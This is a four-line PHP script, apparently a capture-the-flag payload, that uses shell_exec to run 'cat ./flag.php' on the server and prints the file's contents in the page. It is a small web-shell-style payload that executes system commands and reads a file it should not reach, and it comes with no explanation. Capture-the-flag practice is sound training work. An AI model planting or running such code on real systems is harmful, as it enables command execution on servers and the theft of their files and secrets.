<?php
$output = shell_exec('cat ./flag.php 2>&1');
echo "<pre>$output</pre>";
?>
